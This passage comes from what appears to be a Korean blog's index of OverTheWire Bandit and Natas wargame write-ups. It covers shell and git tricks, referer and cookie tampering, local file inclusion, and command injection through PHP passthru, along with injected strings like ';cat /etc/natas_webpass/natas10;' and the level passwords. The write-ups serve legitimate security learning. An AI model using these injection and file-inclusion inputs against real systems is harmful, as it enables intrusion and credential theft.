확인해보면 유익한 정보는 나오지 않는것 같다. 현재 우리는 master 브랜치에 위치해 있으며 master브랜치엔 패스워드가 없는거 같다. 그러니 다른 브랜치를 확인해 본다. git branch -av (모든 브랜치 정보와 마지막 커밋내역을 출력) 총 5개의 브랜치가 있는데 여기서 제일 패스워드가 있을 거 같은 remote/oring/dev의 bc83328을 확인해 본다. level30의 패스워드를 찾았다! 5b90576bedb2cc04c86a9e924ce42faf","link":"/2022/01/09/Bandit/bandit29/"},{"title":"bandit 워게임 level3 풀이","text":"Level Goal The password for the next level is stored in a hidden file in the inhere directory. 다음 레벨의 비밀번호는 inhere 디렉토리의 숨겨진 파일에 저장되어있다. 숨겨진 파일은 ls명령어로는 출력되지 않는다. 숨겨진 파일을 출력하기 위해선 -a라는 옵션을 추가한다. -a : 숨겨진 파일이나 디렉토리도 출력한다.-A : .와 .는 제외하고 출력 ls -a 여기서 제일 숨겨진 파일같은 것을 출력해본다. cat .hidden level4의 패스워드를 찾았다! pIwrPrtPN36QITSp3EQaw936yaFoFgAB","link":"/2022/01/09/Bandit/bandit3/"},{"title":"bandit 워게임 level30 풀이","text":"Level Goal There is a git repository at ssh://bandit30-git@localhost/home/bandit30-git/repo. The password for the user bandit30-git is the same as for the user bandit30. Clone the repository and find the password for the next level. ssh://bandit30-git@localhost/home/bandit30-git/repo에 git 저장소가 있습니다. bandit30-git 사용자의 비밀번호는 bandit30 사용자의 비밀번호와 동일합니다. 저장소를 복제하고 다음 레벨의 비밀번호를 찾으십시오. README.md를 읽어보니 빈파일이라며 사악하게 웃고 있다. 혹시 몰라 로그와 브랜치 정보를 확인해 보았지만 아무런 소용이 없었다. 깃은 SHA-1 값이 저장된 파일 이름을 Refs(References)라고 부르는데 이 파일들은 .git/refs 디렉토리에 있다. 여기에 우리가 원하는 SHA값이 있는지 확인해 본다. find .git/refs 모든 파일을 출력해 확인해 봤지만 별 소득이 없었다. 그럼 이러한 refs를 모아둔 패키지에 들어가 확인해 본다. Git은 때가 되면 자동으로 auto gc'' 명령을 실행한다. 이 명령이 실행되는 경우 대부분은 아무런 일도 일어나지 않는다. Loose 개체가 너무 많거나, Packfile 자체가 너무 많으면 Git은 그제야 진짜로 git gc 명령이 일하게 한다. gc 명령은 Garbage를 Collect 하는 명령이다. 이 명령은 Loose 개체를 모아서 Packfile에 저장하거나 작은 Packfile을 모아서 하나의 큰 Packfile에 저장한다. 아무런 커밋도 가리키지 않는 개체가 있고 오랫동안(대략 몇 달쯤) 아무도 쓰지 않는다면 개체를 삭제한다. git gc 를 실행하면 refs 에 있는 파일은 사라진다. 대신 Git은 그 파일을 .git/packed-refs 파일로 압축해서 효율을 높인다. 아까완 다르게 secret이라는 새로생긴 친구가 보인다. 내용을 확인해 본다. level31의 패스워드를 찾았다! 47e603bb428404d265f59c42920d81e5","link":"/2022/01/09/Bandit/bandit30/"},{"title":"bandit 워게임 level31 풀이","text":"Level Goal There is a git repository at ssh://bandit31-git@localhost/home/bandit31-git/repo. The password for the user bandit31-git is the same as for the user bandit31. Clone the repository and find the password for the next level. ssh://bandit31-git@localhost/home/bandit31-git/repo에 git 저장소가 있습니다. bandit31-git 사용자의 비밀번호는 bandit31 사용자의 비밀번호와 동일합니다. 저장소를 복제하고 다음 레벨의 비밀번호를 찾으십시오. README.md를 읽어본다 This time your task is to push a file to the remote repository.이번에는 파일을 원격 저장소로 푸시하는 작업입니다. 파일이름 : key.txt내용 : May I come in?브랜치 : master key.txt에 **May I come in?**넣고 커밋하면 될 것 같다. echo May I come in? &gt; key.txt 커밋을 한다. .gitignore 파일 때문에 파일이 커밋이 안된다. gitignore에 작성된 파일들은 커밋이 안된다. 밑줄에 당신이 진짜 원하면 -f로 추가할 수 있다고 한다. 커밋이 되었다. 이제 푸쉬를 해본다. level32의 패스워드를 찾았다! 56a9bf19c63d650ce78e6ec0354ee45e","link":"/2022/01/09/Bandit/bandit31/"},{"title":"bandit 워게임 level32 풀이","text":"Level Goal After all this git stuff its time for another escape. Good luck! 결국 이 자식은 또 다른 탈출을 위한 시간을 가집니다. 행운을 빕니다! band32의 쉘다르게 뭔가 심상치 않다. 입력한 문자를 대문자로 변경해버린다… 명령어가 먹히지 않는다… 하지만 $0사용하면 bash로 변경할 수 있다. 참고 : https://www.gnu.org/savannah-checkouts/gnu/bash/manual/bash.html#Positional-Parameters $0은 쉘 또는 쉘 스크립트의 이름으로 확장됩니다. 이것은 쉘 초기화에서 설정됩니다. Bash가 명령 파일과 함께 호출되면 $0이 해당 파일의 이름으로 설정됩니다. bash쉘을 호출하고 $0파라미터에 파일명을 저장한다는 거 같다. bash쉘을 사용할 수 있으니 패스워드를 출력해본다. level33의 패스워드를 찾았다! c9c3199ddf4121b10cf581a98d51caee","link":"/2022/01/09/Bandit/bandit32/"},{"title":"bandit 워게임 level4 풀이","text":"Level Goal The password for the next level is stored in the only human-readable file in the inhere directory. Tip: if your terminal is messed up, try the “reset” command. 다음 레벨의 비밀번호는 inhere 디렉토리에서 사람이 읽을 수 있는 유일한 파일에 저장됩니다. 팁: 터미널이 엉망이면 “재설정” 명령을 시도하십시오. inhere디렉토리에 들어가 어떤 파일이 있는지 확인한다. 2가지 방법으로 풀수 있다. 첫번째 방법 : 전부다 출력!이 디렉토리에 있는 10개의 파일을 하나씩 내용을 출력 해본다. 대부분 파일의 내용이 이상한 형태로 출력되었지만 -file07의 내용만이 우리가 알수 있는 형태로 출력되었다. (터미널이 어지럽게 있다면 clear라는 명령어를 사용하면 깔끔해진다.) 아마 이것이 패스워드인것 같다. 두번째 방법 : 파일의 타입을 확인!file이라는 명령어는 파일의 타입을 확인하는 명령어이다. file ./* : 이 디렉토리에 있는 모든 파일의 타입을 출력 여기서 혼자만 ASCII TEXT타입을 가진 파일**-file07**이 정답일 확률이 높다. level5의 패스워드를 찾았다! koReBOKuIDDepwhWk7jZC0RTdopnAYKh","link":"/2022/01/09/Bandit/bandit4/"},{"title":"bandit 워게임 level5 풀이","text":"Level Goal The password for the next level is stored in a file somewhere under the inhere directory and has all of the following properties: human-readable1033 bytes in sizenot executable 다음 레벨의 비밀번호는 inhere 디렉토리 아래 어딘가에 있는 파일에 저장되며 다음 속성을 모두 갖습니다. 사람이 읽을 수 있는 1033바이트 크기 실행 불가 inhere디렉토리에 들어가 어떤 파일이 있는지 확인한다. 20개의 디렉토리가 나왔다. level4에서 사용했던 방법을 사용할순 있지만 매우 번거러울 것 같다. 힌트를 더 살펴보면 1033바이트 크기의 파일이라는 정보를 얻을 수 있다. 이 정보를 토대로 검색을 하면 빠르게 파일을 찾을 수 있을 것 같다. find라는 명령어를 사용하여 크기가 1033바이트인 파일을 검색하면 된다. file 명령어 옵션중 -size을 사용하면 된다. file . -size 1033c (현재 디렉토리에서 크기가 1033바이트인 파일 검색) 사이즈 단위 b : 블록단위 c : 바이트 (byte) k : 킬로바이트 (kilobyte) w : 2바이트 워드 (2 byte word) m : 메가 바이트 (megabyte) g : 기가 바이트 (gigabyte) level6의 패스워드를 찾았다! DXjZPULLxYr17uwoI01bNLQbtFemEgo7","link":"/2022/01/09/Bandit/bandit5/"},{"title":"bandit 워게임 level6 풀이","text":"Level Goal The password for the next level is stored somewhere on the server and has all of the following properties: owned by user bandit7owned by group bandit633 bytes in size 다음 레벨의 비밀번호는 서버의 어딘가에 저장되며 다음 속성을 모두 갖는다. 사용자 bandit7 소유 bandit6 그룹 소유 33바이트 크기 저번처럼 find명령어를 이용하여 파일을 찾는다. find / -user bandit7 -group bandit6 -size 33c (최상위 디렉토리에서 사용자가 bandit7 그룹이 bandit6 사이즈가 33바이트인 파일 검색) 조건에 부합하는 여러 파일들이 많이 있지만 거의 모든 것이 권한 거부(Permission denied)가 되어있다.하지만 단 하나의 파일만이 권한 거부가 없다. cat /var/lib/dpkg/info/bandit7.password level7의 패스워드를 찾았다! HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs","link":"/2022/01/09/Bandit/bandit6/"},{"title":"bandit 워게임 level7 풀이","text":"Level Goal The password for the next level is stored in the file data.txt next to the word millionth 다음 레벨의 비밀번호는 millionth라는 단어 옆에 있는 data.txt 파일에 저장되어있다. grep 명령어를 이용하여 파일 내의 문자열을 검색한다. grep ‘millionth*’ ./data.txt (data.txt 파일 내에 millionth 다음 문자열 검색) level8의 패스워드를 찾았다! cvX2JJa4CFALtqS87jk27qwqGhBM9plV","link":"/2022/01/09/Bandit/bandit7/"},{"title":"bandit 워게임 level8 풀이","text":"Level Goal The password for the next level is stored in the file data.txt and is the only line of text that occurs only once 다음 레벨의 암호는 data.txt 파일에 저장되며 한 번만 나타나는 텍스트의 유일한 줄이다. 요약하자면 중복되지 않은 유일한 문장을 찾아야한다. data.txt의 내용을 보면 무수히 문장의 암호가 출력된다. 이 중 중복되지 않은 문장을 uniq출력하면 될 것 같다.하지만 연속적인 중복만 제거하므로 sort로 정렬해주어야한다. sort와uniq 명령어를 동시에 사용하여 문자열을 출력한다. cat data.txt | sort | uniq -u (data.txt의 각 줄을 내림차순으로 정렬하고 중복된 줄을 제거한 뒤 출력) level9의 패스워드를 찾았다! UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR","link":"/2022/01/09/Bandit/bandit8/"},{"title":"bandit 워게임 level9 풀이","text":"Level Goal The password for the next level is stored in the file data.txt in one of the few human-readable strings, preceded by several ‘=’ characters. 다음 레벨의 비밀번호는 몇 개의 ‘=’ 문자가 앞에 오는 사람이 읽을 수 있는 몇 가지 문자열 중 하나로 data.txt 파일에 저장된다. data.txt의 내용을 보면 이해할 수 없는 문자들로 난잡하다. 이를 string명령어를 사용하여 사람이 읽을 수 있는 **문자(ASCII)**를 추출하여 출력하면 된다. strings data.txt 이를 실행하고 나면 아까 나온 힌트대로 = 앞에 오는 문자열을 찾을 수 있다. level10의 패스워드를 찾았다! truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk","link":"/2022/01/09/Bandit/bandit9/"},{"title":"Natas 워게임 level0 풀이","text":"Level Goal You can find the password for the next level on this page. 이 페이지에서 다음 레벨의 비밀번호를 찾을 수 있습니다. Username: natas0Password: natas0URL: http://natas0.natas.labs.overthewire.org 접속하면 다음과 같은 페이지가 보인다. 이 페이지에 비밀번호가 있다고 한다. 아마 소스코드를 보면 될거 같다.우클릭하여 페이지 소스 보기를 누른다. &lt;html&gt; &lt;head&gt; &lt;!-- This stuff in the header has nothing to do with the level --&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt; &lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt; &lt;script&gt;var wechallinfo = { &quot;level&quot;: &quot;natas0&quot;, &quot;pass&quot;: &quot;natas0&quot; };&lt;/script&gt;&lt;/head&gt; &lt;body&gt; &lt;h1&gt;natas0&lt;/h1&gt; &lt;div id=&quot;content&quot;&gt; You can find the password for the next level on this page. &lt;!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto --&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; level1의 패스워드를 찾았다! gtVrDuiDfck831PqWsLEZy5gyDz1clto","link":"/2022/01/20/Natas/natas0/"},{"title":"Natas 워게임 level1 풀이","text":"Level Goal You can find the password for the next level on this page, but rightclicking has been blocked! 이 페이지에서 다음 레벨의 비밀번호를 찾을 수 있지만 오른쪽 클릭이 차단되었습니다! Username: natas1URL: http://natas1.natas.labs.overthewire.org 우클릭이 막혀있어 페이지 소스를 볼수 없다.. 그럼 F12를 눌러 개발자도구를 열어 소스 탭으로 이동하면 된다! &lt;html&gt; &lt;head&gt; &lt;!-- This stuff in the header has nothing to do with the level --&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt; &lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt; &lt;script&gt;var wechallinfo = { &quot;level&quot;: &quot;natas1&quot;, &quot;pass&quot;: &quot;gtVrDuiDfck831PqWsLEZy5gyDz1clto&quot; };&lt;/script&gt;&lt;/head&gt; &lt;body oncontextmenu=&quot;javascript:alert('right clicking has been blocked!');return false;&quot;&gt; &lt;h1&gt;natas1&lt;/h1&gt; &lt;div id=&quot;content&quot;&gt; You can find the password for the next level on this page, but rightclicking has been blocked! &lt;!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi --&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; level2의 패스워드를 찾았다! ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi","link":"/2022/01/20/Natas/natas1/"},{"title":"Natas 워게임 level2 풀이","text":"Level Goal There is nothing on this page 이 페이지에 아무것도 없습니다 Username: natas3URL: http://natas3.natas.labs.overthewire.org 페이지 소스를 봐도 패스워드가 없다. 대신 어떤 이미지 파일이 있는데 files라는 경로에 있다.혹시 모르니 files로 이동해본다. http://natas2.natas.labs.overthewire.org/files/ 이미지파일과 텍스트파일이 있다.텍스트 파일을 열어본다. level3의 패스워드를 찾았다! sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14","link":"/2022/01/20/Natas/natas2/"},{"title":"Natas 워게임 level3 풀이","text":"Level Goal There is nothing on this page 이 페이지에 아무것도 없습니다 Username: natas3URL: http://natas3.natas.labs.overthewire.org 이번엔 진짜로 패스워드에 관한 정보가 없다… Not even Google will find it this time…구글도 이번에는 못찾는다고 한다…그럴일 없다 우린 언제나 그랬듯 구글에서 방법을 찾을수 있을 것이다. 그렇다 찾아내고 말았다. robots.txt를 이용해 크롤링을 하면된다! 웹사이트의 최상위 디렉토리 (url)뒤에 /robots.txt를 추가해 불러와본다. http://natas3.natas.labs.overthewire.org/robots.txt /s3cr3t라는 디렉토리만 검색엔진에 노출되도록 설정이 되어있다./s3cr3t디렉토리로 이동해 본다. users.txt에 들어가본다! level4의 패스워드를 찾았다! Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ","link":"/2022/01/20/Natas/natas3/"},{"title":"Natas 워게임 level4 풀이","text":"Level Goal Access disallowed. You are visiting from “http://222.120.75.153/&quot; while authorized users should come only from “http://natas5.natas.labs.overthewire.org/&quot; 액세스가 허용되지 않습니다. 귀하는 “http://222.120.75.153/&quot;에서 방문하고 있으며 승인된 사용자는 “http://natas5.natas.labs.overthewire.org/&quot;에서만 방문해야 합니다. Username: natas4URL: http://natas4.natas.labs.overthewire.org 이번엔 http://natas5.natas.labs.overthewire.org/ 에서 http://natas4.natas.labs.overthewire.org/ 를 접속해야 패스워드가 열린다. burp suite를 사용한다! 페이지를 새로고침할 때 마다 전에 있던 URL주소(referer부분)들이 출력되어 나온다. referer의 주소를 http://natas5.natas.labs.overthewire.org/로 바꾸어 요청을 보낸다. level5의 패스워드를 찾았다! iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq","link":"/2022/01/20/Natas/natas4/"},{"title":"Natas 워게임 level5 풀이","text":"Level Goal Access disallowed. You are not logged in 액세스가 허용되지 않습니다. 로그인하지 않았습니다. Username: natas5URL: http://natas5.natas.labs.overthewire.org 사용자 이름과 패스워드를 정확이 입력했지만뭔지 몰라도 무언가가 로그인이 안된 것처럼 하는 같다. 패킷의 내용을 확인해 본다. 이름에서 부터 냄새가 나는 쿠기의 loggedin값이 0으로 되어 있다.해당부분을 변경하면 될거 같다. 0은 거짓을 의미하니 참을 의미하는 1로 변경하여 요청을 보내본다. level6의 패스워드를 찾았다! aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1","link":"/2022/01/20/Natas/natas5/"},{"title":"Natas 워게임 level6 풀이","text":"Level Goal Input secret 비밀번호 입력: Username: natas6URL: http://natas6.natas.labs.overthewire.org 무언가를 입력하면 level7패스워드가 출력될 것 같다. 소스코드를 보는 버튼이 있다. 일단 코드를 분석해 본다. &lt;html&gt; &lt;head&gt; &lt;!-- This stuff in the header has nothing to do with the level --&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt; &lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt; &lt;script&gt;var wechallinfo = { &quot;level&quot;: &quot;natas6&quot;, &quot;pass&quot;: &quot;&lt;censored&gt;&quot; };&lt;/script&gt;&lt;/head&gt; &lt;body&gt; &lt;h1&gt;natas6&lt;/h1&gt; &lt;div id=&quot;content&quot;&gt; &lt;? include &quot;includes/secret.inc&quot;; if(array_key_exists(&quot;submit&quot;, $_POST)) { if($secret == $_POST['secret']) { print &quot;Access granted. The password for natas7 is &lt;censored&gt;&quot;; } else { print &quot;Wrong secret&quot;; } } ?&gt; &lt;form method=post&gt; Input secret: &lt;input name=secret&gt;&lt;br&gt; &lt;input type=submit name=submit&gt; &lt;/form&gt; &lt;div id=&quot;viewsource&quot;&gt;&lt;a href=&quot;index-source.html&quot;&gt;View sourcecode&lt;/a&gt;&lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 패스워드를 입력하면secret값과 비교하여 참이면 level7의 패스워드를 출력해주는 것 같다. 보니까 include/secret.inc라는 파일이 불러와져 있다..inc확장자를 처음본다..궁금해서 찾아보니 선언, 헤더, 함수 또는 프로그램의 소스코드가 참조하는 기타 데이터가 포함 된 텍스트 파일이라고 한다. 더 자세히 보자면 *.inc파일은 웹프로그래밍을 할 때 include를 위한 확장자이다.*.inc 파일을 웹서버가 기본설정일 경우 특별히 서버에서 실행을 하지 않고 일반 TEXT 취급을 한다.*.inc파일에 중요한 정보가 있다면 노출될 위험이 있으므로 *.inc에는 중요한 정보는 기입하지 않는 것이 좋다.예를들어 index.php나 다른페이지에서 항상 사용되는 함수나 HTML코드들을 담아두고 include해서 사용하게 된다. 파일 이름을 보니 secret값과 매우 유사한 관계인 것 같다.내용을 확인해 본다. http://natas6.natas.labs.overthewire.org/includes/secret.inc secret의 값을 알아냈다. 이제 값을 입력하면 된다! level7의 패스워드를 찾았다! 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9","link":"/2022/01/20/Natas/natas6/"},{"title":"Natas 워게임 level7 풀이","text":"Level Goal Input secret 비밀번호 입력 Username: natas8URL: http://natas8.natas.labs.overthewire.org Home과 About라는 하이퍼링크 밖에 없다.어떤 문제인지 감이 안온다. 일단 소스코드를 본다. &lt;html&gt; &lt;head&gt; &lt;!-- This stuff in the header has nothing to do with the level --&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt; &lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt; &lt;script&gt;var wechallinfo = { &quot;level&quot;: &quot;natas7&quot;, &quot;pass&quot;: &quot;7z3hEENjQtflzgnT29q7wAvMNfZdh0i9&quot; };&lt;/script&gt;&lt;/head&gt; &lt;body&gt; &lt;h1&gt;natas7&lt;/h1&gt; &lt;div id=&quot;content&quot;&gt; &lt;a href=&quot;index.php?page=home&quot;&gt;Home&lt;/a&gt; &lt;a href=&quot;index.php?page=about&quot;&gt;About&lt;/a&gt; &lt;br&gt; &lt;br&gt; &lt;!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 --&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 힌트로 natas8의 패스워드의 경로가 나왔다. 일단 Home과 About를 눌러본다. http://natas7.natas.labs.overthewire.org/index.php?page=home http://natas7.natas.labs.overthewire.org/index.php?page=about Home과 About페이지를 이동하면서 **page=**의 다음 부분만 달라진다는 것을 알아냈다.page=다음에 방금 알아낸 경로를 입력하면 될 것 같다. http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8 level8의 패스워드를 찾았다! DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe","link":"/2022/01/20/Natas/natas7/"},{"title":"Natas 워게임 level8 풀이","text":"Level Goal Input secret 비밀번호 입력 Username: natas8URL: http://natas8.natas.labs.overthewire.org 원하는 값을 입력하면 패스워드를 얻을 수 있을 것 같다. 하이퍼링크를 눌러 소스코드를 본다. &lt;html&gt; &lt;head&gt; &lt;!-- This stuff in the header has nothing to do with the level --&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt; &lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt; &lt;script&gt;var wechallinfo = { &quot;level&quot;: &quot;natas8&quot;, &quot;pass&quot;: &quot;&lt;censored&gt;&quot; };&lt;/script&gt;&lt;/head&gt; &lt;body&gt; &lt;h1&gt;natas8&lt;/h1&gt; &lt;div id=&quot;content&quot;&gt; &lt;? $encodedSecret = &quot;3d3d516343746d4d6d6c315669563362&quot;; function encodeSecret($secret) { return bin2hex(strrev(base64_encode($secret))); } if(array_key_exists(&quot;submit&quot;, $_POST)) { if(encodeSecret($_POST['secret']) == $encodedSecret) { print &quot;Access granted. The password for natas9 is &lt;censored&gt;&quot;; } else { print &quot;Wrong secret&quot;; } } ?&gt; &lt;form method=post&gt; Input secret: &lt;input name=secret&gt;&lt;br&gt; &lt;input type=submit name=submit&gt; &lt;/form&gt; &lt;div id=&quot;viewsource&quot;&gt;&lt;a href=&quot;index-source.html&quot;&gt;View sourcecode&lt;/a&gt;&lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 이번엔 encodedSecret이라는 값과 내가 입력한 값을 비교한다.그냥 비교하는 것이 아닌 base64로 암호화 하고 문자열을 뒤집고 ASCII문자의 문자열을 16진수로 바꿔 비교를 한다. bin2hex : ASCII문자의 문자열을 16진수로 변환하다.strrev : 문자열을 역순을 재배치한다.base64_encode : base64로 암호화한다. 그렇다면 반대로 진행한다면 초기값이 나올테고 그것이 우리가 입력해야될 값이 될 것이다. 복호화를 진행해본다. CyberChef라는 사이트를 이용하였다. magic이라는 기능을 이용하면 자동으로 복호화해준다.그게 아니어도 원하는 복호화나 암호화를 할수 있다. 처음엔 16진수에서 ASCII문자로 바꾼다. ==QcCtmMml1ViV3b 문자열을 뒤집는다. 사이트를 이용하면 편하다. b3ViV1lmMmtCcQ== base64로 암호화 되어있는 암호문을 복호화 한다. oubWYf2kBq 드디어 비밀번호를 알아냈다.이제 입력한다! level9의 패스워드를 찾았다! W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl","link":"/2022/01/20/Natas/natas8/"},{"title":"Natas 워게임 level9 풀이","text":"Level Goal Find words containing 포함하는 단어 찾기 Username: natas9URL: http://natas9.natas.labs.overthewire.org 검색창과 소스코드 하이퍼 링크가 있다. 일단 소스코드를 봐본다. &lt;html&gt; &lt;head&gt; &lt;!-- This stuff in the header has nothing to do with the level --&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt; &lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt; &lt;script&gt;var wechallinfo = { &quot;level&quot;: &quot;natas9&quot;, &quot;pass&quot;: &quot;&lt;censored&gt;&quot; };&lt;/script&gt;&lt;/head&gt; &lt;body&gt; &lt;h1&gt;natas9&lt;/h1&gt; &lt;div id=&quot;content&quot;&gt; &lt;form&gt; Find words containing: &lt;input name=needle&gt;&lt;input type=submit name=submit value=Search&gt;&lt;br&gt;&lt;br&gt; &lt;/form&gt; Output: &lt;pre&gt; &lt;? $key = &quot;&quot;; if(array_key_exists(&quot;needle&quot;, $_REQUEST)) { $key = $_REQUEST[&quot;needle&quot;]; } if($key != &quot;&quot;) { passthru(&quot;grep -i $key dictionary.txt&quot;); } ?&gt; &lt;/pre&gt; &lt;div id=&quot;viewsource&quot;&gt;&lt;a href=&quot;index-source.html&quot;&gt;View sourcecode&lt;/a&gt;&lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 입력값을 needle이라는 이름으로 받아오고 이를 dictinary.txt에서 입력값을 포함한 문자열을 출력한다. 혹시나해서 dictinary.txt로 이동해 보았다. 대략 5만개의 문자열이 있다. 노가다로 찾는건 아닌것 같다. 아니 하면 안되는 것 같다. 함수들의 취약점을 찾는 도중passthru의 command injection을 찾게 되었다. 이를 이용하면 될 것 같다. 먼저 세미콜론(;)을 치고 원하는 시스템 명령어를 입력한다. 실제로 ls -al 명령어가 실행되어 출력되었다. 우리가 찾고 싶은거는 natas10의 대한것이니 이에 관한것을 찾아본다. ;find / -user natas10; 총 두개의 파일을 찾아냈다. /var/www/natas/natas10/etc/natas_webpass/natas10 일단 제일 의심가는 /etc/natas_webpass/natas10을 열어본다. ;cat /etc/natas_webpass/natas10; level10의 패스워드를 찾았다! W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl","link":"/2022/01/20/Natas/natas9/"},{"title":"Natas 워게임 level10 풀이","text":"Level Goal Find words containing 포함하는 단어 찾기 Username: natas10URL: http://natas10.natas.labs.overthewire.org 전 단계와 동일하게 검색창과 소스코드 하이퍼링크가 있다. 일단 소스코드로 이동한다. &lt;html&gt; &lt;head&gt; &lt;!-- This stuff in the header has nothing to do with the level --&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://natas.labs.overthewire.org/css/level.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/jquery-ui.css&quot; /&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;http://natas.labs.overthewire.org/css/wechall.css&quot; /&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-1.9.1.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;http://natas.labs.overthewire.org/js/jquery-ui.js&quot;&gt;&lt;/script&gt; &lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js&gt;&lt;/script&gt;&lt;script src=&quot;http://natas.labs.overthewire.org/js/wechall.js&quot;&gt;&lt;/script&gt; &lt;script&gt;var wechallinfo = { &quot;level&quot;: &quot;natas10&quot;, &quot;pass&quot;: &quot;&lt;censored&gt;&quot; };&lt;/script&gt;&lt;/head&gt; &lt;body&gt; &lt;h1&gt;natas10&lt;/h1&gt; &lt;div id=&quot;content&quot;&gt; For security reasons, we now filter on certain characters&lt;br/&gt;&lt;br/&gt; &lt;form&gt; Find words containing: &lt;input name=needle&gt;&lt;input type=submit name=submit 